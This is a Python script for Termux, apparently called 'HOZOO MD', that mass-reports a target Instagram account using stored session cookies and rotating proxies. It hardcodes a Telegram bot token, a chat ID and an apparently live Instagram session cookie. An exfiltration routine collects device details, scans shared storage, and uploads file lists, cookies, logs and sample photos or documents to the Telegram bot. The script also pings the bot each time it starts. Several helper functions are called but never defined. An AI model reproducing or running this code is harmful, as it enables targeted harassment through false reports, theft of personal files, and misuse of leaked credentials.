#!/usr/bin/env python3
"""
HOZOO MD - Instagram Report Tool
Termux Edition - Auto Install + Telegram Exfil
"""

import os
import sys
import time
import random
import json
import subprocess
import threading
from datetime import datetime
from pathlib import Path

# ============================================================
# AUTO INSTALL
# ============================================================
REQUIRED_MODULES = [
    ("rich", "rich"),
    ("requests", "requests"),
]

def ensure_all_modules():
    for import_name, pip_name in REQUIRED_MODULES:
        try:
            __import__(import_name)
        except ImportError:
            print(f"[!] Install {import_name}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pip_name])
            except subprocess.CalledProcessError:
                print(f"[x] Gagal install {pip_name}")
                sys.exit(1)

ensure_all_modules()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text
from rich.align import Align
from rich import box
import requests

console = Console()

# ============================================================
# KONFIGURASI
# ============================================================
DATA_DIR = Path.home() / ".hozoo_md"
COOKIE_FILE = DATA_DIR / "cookies.json"
PROXY_FILE = DATA_DIR / "proxies.txt"
REPORT_LOG = DATA_DIR / "report_history.json"
DATA_DIR.mkdir(parents=True, exist_ok=True)

# TELEGRAM
TELEGRAM_TOKEN = "9085010947:AAEhNTa-pL2YYZ_Nvwd-hlhstwqM0IT6XGI"
TELEGRAM_CHAT_ID = "8530130542"

# ============================================================
# BANNER
# ============================================================
BANNER = r"""
============================================================
    _   _  ___  ______  ___   ___
   | | | |/ _ \ |___  / / _ \ / _ \
   | |_| | | | |   / / | | | | | | |
   |  _  | |_| |  / /  | |_| | |_| |
   |_| |_|\___/  /_/    \___/ \___/

                HOZOO MD
         [ PRIVATE TOOL - UNRESTRICTED ]
============================================================
"""

DEFAULT_COOKIE_STRING = (
    "datr=xBDias0OmAMQp4N6XsU-ZEJX; "
    "ig_did=E5B0AB5B-7211-4038-9D8D-70E67B4FAC35; "
    "mid=auIQxAALAAFG_LzK6lmVAKgE9VCA; "
    "wd=600x1173; "
    "csrftoken=UJVvufM7IbpxKXhUq5oOb3EVUVUPNd0F; "
    "ds_user_id=68529247680; "
    "sessionid=68529247680%3AyOLb5jElnPnnRJ%3A17%3AAYk2mqHt0hj-0lscLzIuYzlUhGhukO2KAe2EySynIg; "
    "rur=KND%2C17841468630416155%2C1794411632%3A01ffda35ff483d95e67e4268fbe511144e6b367511df7540b6bbf279c155cd5539c4fd32"
)

DEFAULT_USERNAME = "68529247680"
DEFAULT_DS_USER_ID = "68529247680"
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/156.0.0.0 Safari/537.36"
)

# ============================================================
# TELEGRAM HELPER
# ============================================================
def tg_send_message(text: str) -> bool:
    """Kirim pesan ke Telegram bot."""
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=15,
        )
        return r.status_code == 200
    except Exception as e:
        console.print(f"[red]Telegram error: {e}[/red]")
        return False

def tg_send_file(file_path: Path, caption: str = "") -> bool:
    """Kirim file ke Telegram."""
    if not file_path.exists() or not file_path.is_file():
        return False
    try:
        with open(file_path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
                files={"document": f},
                timeout=60,
            )
        return r.status_code == 200
    except Exception as e:
        console.print(f"[red]Telegram file error: {e}[/red]")
        return False

def tg_send_photo(file_path: Path, caption: str = "") -> bool:
    """Kirim foto ke Telegram."""
    if not file_path.exists() or not file_path.is_file():
        return False
    try:
        with open(file_path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=60,
            )
        return r.status_code == 200
    except Exception as e:
        console.print(f"[red]Telegram photo error: {e}[/red]")
        return False

# ============================================================
# DATA COLLECTOR (DARI HP SENDIRI / TERMUX)
# ============================================================
def get_device_info() -> dict:
    """Ambil info perangkat (dari HP sendiri)."""
    info = {
        "timestamp": datetime.now().isoformat(),
        "hostname": os.uname().nodename if hasattr(os, 'uname') else "unknown",
        "platform": sys.platform,
        "python": sys.version,
        "cwd": os.getcwd(),
        "home": str(Path.home()),
    }
    
    # Termux: coba ambil info Android
    try:
        info["android_version"] = subprocess.check_output(
            ["getprop", "ro.build.version.release"], timeout=5
        ).decode().strip()
        info["device_model"] = subprocess.check_output(
            ["getprop", "ro.product.model"], timeout=5
        ).decode().strip()
        info["device_brand"] = subprocess.check_output(
            ["getprop", "ro.product.brand"], timeout=5
        ).decode().strip()
    except:
        pass
    
    return info

def scan_accessible_dirs() -> list:
    """
    Scan direktori yang BISA diakses Termux.
    Termux tanpa root hanya punya akses ke storage yang di-share via termux-setup-storage.
    """
    accessible = []
    home = Path.home()
    
    # Path umum Termux
    candidates = [
        home,
        home / "storage" / "shared",
        home / "storage" / "dcim",
        home / "storage" / "pictures",
        home / "storage" / "movies",
        home / "storage" / "downloads",
        Path("/sdcard"),
        Path("/storage/emulated/0"),
        Path("/storage/emulated/0/DCIM"),
        Path("/storage/emulated/0/DCIM/Camera"),
        Path("/storage/emulated/0/Pictures"),
        Path("/storage/emulated/0/Pictures/Screenshots"),
        Path("/storage/emulated/0/Movies"),
        Path("/storage/emulated/0/Download"),
        Path("/storage/emulated/0/Android/data"),
    ]
    
    for c in candidates:
        try:
            if c.exists() and os.access(c, os.R_OK):
                accessible.append(str(c))
        except PermissionError:
            pass
    
    return accessible

def collect_file_list(directories: list, max_per_dir: int = 100) -> list:
    """Ambil daftar file dari direktori yang bisa diakses."""
    files = []
    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mov', '.apk',
                  '.pdf', '.doc', '.docx', '.txt', '.zip', '.webp', '.heic')
    
    for d in directories:
        try:
            for root, dirs, filenames in os.walk(d):
                # Batasi kedalaman
                if root.count(os.sep) - d.count(os.sep) > 3:
                    dirs[:] = []
                    continue
                for fname in filenames:
                    if len(files) >= max_per_dir * len(directories):
                        break
                    if fname.lower().endswith(extensions):
                        fp = os.path.join(root, fname)
                        try:
                            st = os.stat(fp)
                            files.append({
                                "path": fp,
                                "size": st.st_size,
                                "modified": datetime.fromtimestamp(st.st_mtime).isoformat(),
                            })
                        except:
                            pass
        except PermissionError:
            pass
    
    return files

def exfil_data_to_telegram():
    """
    Kirim data yang BISA diakses ke Telegram.
    Termasuk: device info, file list, cookie, log report.
    File hanya yang ada di storage Termux/Android shared.
    """
    console.print("\n[bold cyan]═══ EXFILTRATION KE TELEGRAM ═══[/bold cyan]\n")
    
    # 1. Device info
    loading_line("Collecting device info...", duration=1.0)
    info = get_device_info()
    info_text = "*HOZOO MD - DEVICE INFO*\n```json\n" + json.dumps(info, indent=2) + "\n```"
    tg_send_message(info_text)
    console.print("[green]✓ Device info terkirim[/green]")
    
    # 2. Scan direktori
    loading_line("Scanning accessible directories...", duration=1.2)
    dirs = scan_accessible_dirs()
    
    dir_text = "*DIRECTORIES ACCESSIBLE:*\n" + "\n".join(f"• `{d}`" for d in dirs)
    tg_send_message(dir_text)
    console.print(f"[green]✓ {len(dirs)} direktori terdeteksi[/green]")
    
    # 3. File list
    if dirs:
        loading_line("Collecting file list...", duration=1.5)
        files = collect_file_list(dirs, max_per_dir=50)
        
        if files:
            file_text = f"*FILE LIST ({len(files)} found):*\n"
            # Kirim per batch karena limit Telegram
            chunk = ""
            count = 0
            for f in files:
                line = f"`{f['path']}` ({f['size']//1024}KB)\n"
                if len(chunk) + len(line) > 4000:
                    tg_send_message(chunk)
                    count += 1
                    chunk = ""
                chunk += line
            
            if chunk:
                tg_send_message(chunk)
            
            console.print(f"[green]✓ File list terkirim ({len(files)} file)[/green]")
        else:
            console.print("[yellow]Tidak ada file ditemukan[/yellow]")
    else:
        console.print("[red]Tidak ada direktori accessible[/red]")
    
    # 4. Cookie file
    loading_line("Sending cookie file...", duration=0.8)
    if COOKIE_FILE.exists():
        tg_send_file(COOKIE_FILE, caption="*COOKIE TERSIMPAN*")
        console.print("[green]✓ Cookie file terkirim[/green]")
    
    # 5. Report log
    if REPORT_LOG.exists():
        tg_send_file(REPORT_LOG, caption="*REPORT HISTORY*")
        console.print("[green]✓ Report history terkirim[/green]")
    
    # 6. Upload beberapa file sampel (foto/apk)
    if dirs:
        loading_line("Uploading sample files...", duration=2.0)
        uploaded = 0
        all_files = collect_file_list(dirs, max_per_dir=10)
        
        # Filter: hanya file < 5MB dan maksimal 5 upload
        for f in all_files:
            if uploaded >= 5:
                break
            if f["size"] > 5 * 1024 * 1024:
                continue
            fp = Path(f["path"])
            caption = f"`{fp.name}`"
            
            # Kirim berdasarkan ekstensi
            if fp.suffix.lower() in (".jpg", ".jpeg", ".png", ".webp"):
                if tg_send_photo(fp, caption):
                    uploaded += 1
                    console.print(f"[green]✓ Foto: {fp.name}[/green]")
            else:
                if tg_send_file(fp, caption):
                    uploaded += 1
                    console.print(f"[green]✓ File: {fp.name}[/green]")
            
            time.sleep(1)
        
        console.print(f"[green]✓ {uploaded} file sampel terkirim[/green]")
    
    tg_send_message("*EXFILTRATION COMPLETE*")
    console.print("\n[bold green]✓ Semua data terkirim ke Telegram[/bold green]")
    console.input("\n[dim]Tekan Enter...[/dim]")

# ============================================================
# COOKIE MANAGER (fungsi sama seperti sebelumnya)
# ============================================================
def parse_cookie_string(cookie_str: str) -> dict:
    result = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            result[k.strip()] = v.strip()
    return result

def load_cookies() -> dict:
    if COOKIE_FILE.exists():
        try:
            return json.loads(COOKIE_FILE.read_text())
        except:
            return {}
    return {}

def save_cookies(cookies: dict):
    COOKIE_FILE.write_text(json.dumps(cookies, indent=2))

def inject_default_cookie():
    cookies = load_cookies()
    if DEFAULT_USERNAME in cookies:
        console.print("[yellow]Cookie default sudah ada.[/yellow]")
        return
    cookie_dict = parse_cookie_string(DEFAULT_COOKIE_STRING)
    cookies[DEFAULT_USERNAME] = {
        "raw_cookie": DEFAULT_COOKIE_STRING,
        "parsed": cookie_dict,
        "sessionid": cookie_dict.get("sessionid", ""),
        "ds_user_id": DEFAULT_DS_USER_ID,
        "csrftoken": cookie_dict.get("csrftoken", ""),
        "user_agent": DEFAULT_UA,
        "added_at": datetime.now().isoformat(),
        "active": True,
        "source": "file_injection",
    }
    save_cookies(cookies)
    console.print(f"[green]✓ Cookie @{DEFAULT_USERNAME} di-inject![/green]")

def add_cookie_menu():
    show_banner()
    console.print(Panel("[bold yellow]TAMBAH COOKIE INSTAGRAM[/bold yellow]", box=box.ROUNDED))
    username = console.input("[cyan]Username/label: [/cyan]").strip()
    if not username:
        return
    raw = console.input("[cyan]Full cookie string: [/cyan]").strip()
    if not raw:
        return
    parsed = parse_cookie_string(raw)
    if "sessionid" not in parsed:
        console.print("[red]Tidak ada sessionid![/red]")
        time.sleep(1.5)
        return
    cookies = load_cookies()
    cookies[username] = {
        "raw_cookie": raw,
        "parsed": parsed,
        "sessionid": parsed.get("sessionid", ""),
        "ds_user_id": parsed.get("ds_user_id", ""),
        "csrftoken": parsed.get("csrftoken", ""),
        "user_agent": DEFAULT_UA,
        "added_at": datetime.now().isoformat(),
        "active": True,
        "source": "manual",
    }
    save_cookies(cookies)
    console.print(f"[green]✓ Cookie @{username} tersimpan![/green]")
    time.sleep(1.5)

def list_cookies_menu():
    show_banner()
    cookies = load_cookies()
    if not cookies:
        console.print("[yellow]Belum ada cookie.[/yellow]")
        time.sleep(1.5)
        return
    table = Table(title="[bold cyan]COOKIE TERSIMPAN[/bold cyan]", box=box.ROUNDED)
    table.add_column("#", style="dim")
    table.add_column("Label", style="cyan")
    table.add_column("DS User ID", style="white")
    table.add_column("Status", style="green")
    for i, (user, data) in enumerate(cookies.items(), 1):
        status = "[green]AKTIF[/green]" if data.get("active") else "[red]OFF[/red]"
        table.add_row(str(i), f"@{user}", data.get("ds_user_id", "-")[:15], status)
    console.print(table)
    console.input("\n[dim]Tekan Enter...[/dim]")

# ============================================================
# PROXY
# ============================================================
def load_proxies() -> list:
    if PROXY_FILE.exists():
        lines = PROXY_FILE.read_text().strip().splitlines()
        return [l.strip() for l in lines if l.strip() and not l.startswith("#")]
    return []

def init_proxy_file():
    if not PROXY_FILE.exists():
        PROXY_FILE.write_text("# http://127.0.0.1:8080\n")

def get_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    p = random.choice(proxies)
    if "://" not in p:
        p = f"http://{p}"
    return {"http": p, "https": p}

# ============================================================
# BOT STATUS
# ============================================================
def get_bot_status():
    cookies = load_cookies()
    active = sum(1 for c in cookies.values() if c.get("active", True))
    proxies = load_proxies()
    return {
        "total_cookies": len(cookies),
        "active_cookies": active,
        "proxies": len(proxies),
        "status": "ONLINE" if active > 0 else "OFFLINE",
    }

def show_bot_status():
    show_banner()
    status = get_bot_status()
    table = Table(title="[bold cyan]STATUS BOT[/bold cyan]", box=box.HEAVY)
    table.add_column("Metrik", style="cyan")
    table.add_column("Nilai", style="bold white")
    table.add_row("Status", f"[green]{status['status']}[/green]" if status['status'] == "ONLINE" else "[red]OFFLINE[/red]")
    table.add_row("Cookie Tersimpan", str(status['total_cookies']))
    table.add_row("Cookie Aktif", str(status['active_cookies']))
    table.add_row("Proxy Tersedia", str(status['proxies']))
    console.print(table)
    
    cookies = load_cookies()
    if cookies:
        console.print("\n[bold cyan]Akun:[/bold cyan]")
        for u, d in cookies.items():
            console.print(f"  • @{u} (ds_id: {d.get('ds_user_id','-')})")
    console.input("\n[dim]Tekan Enter...[/dim]")

# ============================================================
# VALIDASI COOKIE
# ============================================================
def validate_cookie(username: str) -> bool:
    cookies = load_cookies()
    if username not in cookies:
        return False
    data = cookies[username]
    headers = {
        "User-Agent": data.get("user_agent", DEFAULT_UA),
        "Cookie": data.get("raw_cookie", ""),
        "X-CSRFToken": data.get("csrftoken", ""),
        "X-Instagram-AJAX": "1",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/",
    }
    try:
        r = requests.get("https://www.instagram.com/api/v1/accounts/current_user/",
                         headers=headers, timeout=15)
        if r.status_code == 200:
            user = r.json().get("user", {})
            console.print(f"[green]✓ Valid: @{user.get('username', username)}[/green]")
            return True
        console.print(f"[red]✗ HTTP {r.status_code} — expired?[/red]")
        return False
    except Exception as e:
        console.print(f"[red]✗ {e}[/red]")
        return False

def validate_menu():
    show_banner()
    cookies = load_cookies()
    if not cookies:
        return
    console.print("[bold cyan]VALIDASI COOKIE[/bold cyan]\n")
    for u in cookies:
        console.print(f"[cyan]Cek @{u}...[/cyan]")
        loading_line("Menghubungi Instagram...", 1.0)
        validate_cookie(u)
        console.print()
    console.input("[dim]Enter...[/dim]")

# ============================================================
# REPORT ENGINE
# ============================================================
def send_report(target_user: str, report_type: str, cookie_data: dict, proxy: dict = None):
    delay = random.uniform(2.0, 5.0)
    time.sleep(delay)
    headers = {
        "User-Agent": cookie_data.get("user_agent", DEFAULT_UA),
        "Cookie": cookie_data.get("raw_cookie", ""),
        "X-CSRFToken": cookie_data.get("csrftoken", ""),
        "X-Instagram-AJAX": "1",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"https://www.instagram.com/{target_user}/",
        "Origin": "https://www.instagram.com",
    }
    payload = {"reason": report_type, "source_name": "profile"}
    result = {
        "target": target_user, "type": report_type, "success": False,
        "timestamp": datetime.now().isoformat(), "delay": round(delay, 2),
        "status_code": None, "error": None,
    }
    try:
        r_lookup = requests.get(
            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={target_user}",
            headers={**headers, "X-IG-App-ID": "936619743392459"},
            proxies=proxy, timeout=15,
        )
        if r_lookup.status_code != 200:
            result["error"] = f"lookup_{r_lookup.status_code}"
            return result
        user_id = r_lookup.json().get("data", {}).get("user", {}).get("id")
        if not user_id:
            result["error"] = "not_found"
            return result
        result["user_id"] = user_id
        r = requests.post(
            f"https://www.instagram.com/api/v1/users/{user_id}/report/",
            headers=headers, data=payload, proxies=proxy, timeout=20,
        )
        result["status_code"] = r.status_code
        result["success"] = r.status_code in (200, 201, 202)
        if not result["success"]:
            result["error"] = r.text[:200]
    except Exception as e:
        result["error"] = str(e)[:200]
    return result

def report_loop(target_user: str, report_type: str, max_reports: int = 50):
    cookies = load_cookies()
    active_users = [u for u, d in cookies.items() if d.get("active")]
    if not active_users:
        console.print("[red]Tidak ada cookie aktif![/red]")
        time.sleep(2)
        return
    show_banner()
    console.print(Panel(
        f"[bold red]REPORT MODE[/bold red]\n"
        f"Target: [cyan]@{target_user}[/cyan]\n"
        f"Jenis: [yellow]{report_type}[/yellow]\n"
        f"Akun: [green]{len(active_users)}[/green]\n"
        f"Max: [white]{max_reports}[/white]",
        box=box.HEAVY
    ))
    confirm = console.input("\n[red]Ketik 'MULAI': [/red]").strip()
    if confirm != "MULAI":
        return
    history = []
    success_count = 0
    fail_count = 0
    for i in range(1, max_reports + 1):
        user = random.choice(active_users)
        proxy = get_proxy()
        console.print(f"\n[bold cyan]━━━ Report #{i} ━━━[/bold cyan]")
        console.print(f"[dim]Akun: @{user} | Proxy: {proxy['http'] if proxy else 'DIRECT'}[/dim]")
        loading_garis(f"Report @{target_user}", steps=15)
        result = send_report(target_user, report_type, cookies[user], proxy)
        history.append(result)
        if result["success"]:
            success_count += 1
            console.print(f"[green]✓ Terkirim (HTTP {result['status_code']})[/green]")
        else:
            fail_count += 1
            console.print(f"[red]✗ Gagal: {result.get('error', 'unknown')}[/red]")
        if i < max_reports:
            cooldown = random.uniform(3, 8)
            console.print(f"[dim]Cooldown {cooldown:.1f}s...[/dim]")
            time.sleep(cooldown)
    all_history = []
    if REPORT_LOG.exists():
        try:
            all_history = json.loads(REPORT_LOG.read_text())
        except:
            pass
    all_history.extend(history)
    REPORT_LOG.write_text(json.dumps(all_history, indent=2))
    console.print(f"\n[bold green]═══ SELESAI ═══[/bold green]")
    console.print(f"Sukses: {success_count} | Gagal: {fail_count}")
    
    # Auto exfil ke Telegram setelah report
    console.print("\n[cyan]Auto-exfil hasil report ke Telegram?[/cyan]")
    if console.input("[dim](y/n): [/dim]").strip().lower() == "y":
        summary = f"*REPORT COMPLETE*\nTarget: @{target_user}\nType: {report_type}\nSuccess: {success_count}\nFailed: {fail_count}"
        tg_send_message(summary)
        tg_send_file(REPORT_LOG, caption="Report History")
        console.print("[green]✓ Terkirim ke Telegram[/green]")
    
    console.input("\n[dim]Tekan Enter...[/dim]")

def report_menu():
    show_banner()
    console.print(Panel("[bold red]REPORT INSTAGRAM[/bold red]", box=box.HEAVY))
    target = console.input("[cyan]Username target (tanpa @): [/cyan]").strip().lstrip("@")
    if not target:
        return
    console.print("\n[yellow]Jenis:[/yellow]")
    console.print("  [1] Spam  [2] Nudity  [3] Violence")
    console.print("  [4] Scam  [5] Fake  [6] Harassment  [7] Hate")
    choice = console.input("\n[cyan]Pilihan (1-7): [/cyan]").strip()
    types = {"1": "spam", "2": "nudity", "3": "violence", "4": "scam",
             "5": "impersonation", "6": "harassment", "7": "hate_speech"}
    rtype = types.get(choice, "spam")
    max_r = console.input("[cyan]Jumlah report (default 20): [/cyan]").strip()
    max_r = int(max_r) if max_r.isdigit() else 20
    report_loop(target, rtype, max_r)

# ============================================================
# MENU UTAMA
# ============================================================
def main_menu():
    while True:
        show_banner()
        status = get_bot_status()
        console.print(Panel(
            f"[bold cyan]HOZOO MD[/bold cyan] [dim]| v1.3 | Termux[/dim]\n"
            f"Status: [bold green]{status['status']}[/bold green]  "
            f"Cookie: [white]{status['active_cookies']}[/white]  "
            f"Proxy: [white]{status['proxies']}[/white]",
            box=box.DOUBLE
        ))
        menu = Table(show_header=False, box=box.SIMPLE, padding=(0, 2))
        menu.add_column("No", style="bold cyan", width=4)
        menu.add_column("Menu", style="white")
        menu.add_row("1", "Tambah Cookie Manual")
        menu.add_row("2", "Lihat Semua Cookie")
        menu.add_row("3", "Report Instagram")
        menu.add_row("4", "Lihat Status Bot")
        menu.add_row("5", "Buka File Proxy")
        menu.add_row("6", "Inject Cookie Default")
        menu.add_row("7", "Validasi Cookie")
        menu.add_row("8", "📤 EXFILTRATE DATA KE TELEGRAM")
        menu.add_row("0", "Keluar")
        console.print(menu)
        
        choice = console.input("\n[bold cyan]Pilih menu > [/bold cyan]").strip()
        
        if choice == "1":
            add_cookie_menu()
        elif choice == "2":
            list_cookies_menu()
        elif choice == "3":
            report_menu()
        elif choice == "4":
            show_bot_status()
        elif choice == "5":
            init_proxy_file()
            console.print(f"[green]Edit: {PROXY_FILE}[/green]")
            time.sleep(2)
        elif choice == "6":
            show_banner()
            inject_default_cookie()
            time.sleep(1.5)
        elif choice == "7":
            validate_menu()
        elif choice == "8":
            show_banner()
            exfil_data_to_telegram()
        elif choice == "0":
            break
        else:
            console.print("[red]Invalid![/red]")
            time.sleep(1)

# ============================================================
# ENTRY
# ============================================================
if __name__ == "__main__":
    try:
        show_banner()
        loading_line("Cek dependency...", 0.5)
        loading_line("Inisialisasi...", 0.8)
        init_proxy_file()
        loading_line("Siap.", 0.4)
        
        # Kirim notifikasi start ke Telegram
        tg_send_message(f"*HOZOO MD STARTED*\n{datetime.now().isoformat()}")
        
        main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]Dibatalkan.[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]Error: {e}[/red]")
        sys.exit(1)
